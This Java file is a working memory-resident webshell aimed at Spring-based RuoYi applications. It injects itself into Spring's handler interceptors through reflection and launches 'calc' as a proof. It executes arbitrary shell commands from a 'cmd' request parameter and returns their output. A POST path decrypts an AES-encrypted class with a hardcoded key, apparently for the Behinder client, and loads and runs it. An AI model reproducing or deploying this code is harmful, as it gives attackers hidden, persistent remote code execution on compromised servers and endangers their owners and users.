package artsploit;

import org.apache.tomcat.util.codec.binary.Base64;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.*;

public class TestInterceptor implements HandlerInterceptor {
    private final String k = "e45e329feb5d925b";

    public Class g(byte []b) throws Exception {
        // To get ClassLoader and invoke the protected final Method of ClassLoader
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        Field modifiers = defineClass.getClass().getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(defineClass, defineClass.getModifiers() & ~Modifier.FINAL & ~Modifier.STATIC | Modifier.PUBLIC);

        return (Class) defineClass.invoke(classLoader,b, 0, b.length);
    }

    public TestInterceptor() throws Exception {
        ArrayList<Object> adaptedInterceptors = getAdaptedInterceptors();
        for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
            if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                return;
            }
        }
        adaptedInterceptors.add(this);
        Runtime.getRuntime().exec("calc");
    }


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null && cmd.equals("delete")){
            ArrayList<Object> adaptedInterceptors = getAdaptedInterceptors();
            for (int i = adaptedInterceptors.size() - 1; i > 0; i--) {
                if (adaptedInterceptors.get(i) instanceof TestInterceptor) {
                    adaptedInterceptors.remove(i);
                }
            }
        }else if (cmd != null && request.getMethod().equals("GET")) {
            PrintWriter writer = response.getWriter();
            String o = "";
            ProcessBuilder p;
            if(System.getProperty("os.name").toLowerCase().contains("win")){
                p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
            }else{
                p = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
            }
            Scanner c = new Scanner(p.start().getInputStream()).useDelimiter("\\A");
            o = c.hasNext() ? c.next(): o;
            c.close();
            writer.write(o);
            writer.flush();
            writer.close();
        }else if (cmd != null && request.getMethod().equals("POST")){      // for rebeyond
            HttpSession session = request.getSession();
            session.setAttribute("u", this.k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2,new SecretKeySpec(this.k.getBytes(),"AES"));

            TestInterceptor testInterceptor = new TestInterceptor();
            String base64String = request.getReader().readLine();
            System.out.println(base64String);
            byte[] bytesEncrypted = new Base64().decode(base64String);
            byte[] bytesDecrypted = c.doFinal(bytesEncrypted);
            Class newClass = testInterceptor.g(bytesDecrypted);

            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);
            newClass.newInstance().equals(pageContext);
        }
        return true;
    }

    private ArrayList<Object> getAdaptedInterceptors() throws NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        Field f=Thread.currentThread().getContextClassLoader().loadClass("com.ruoyi.common.utils.spring.SpringUtils").getDeclaredField("applicationContext");
        f.setAccessible(true);
        org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext)f.get(null);
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
        Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);
        return adaptedInterceptors;
    }
}
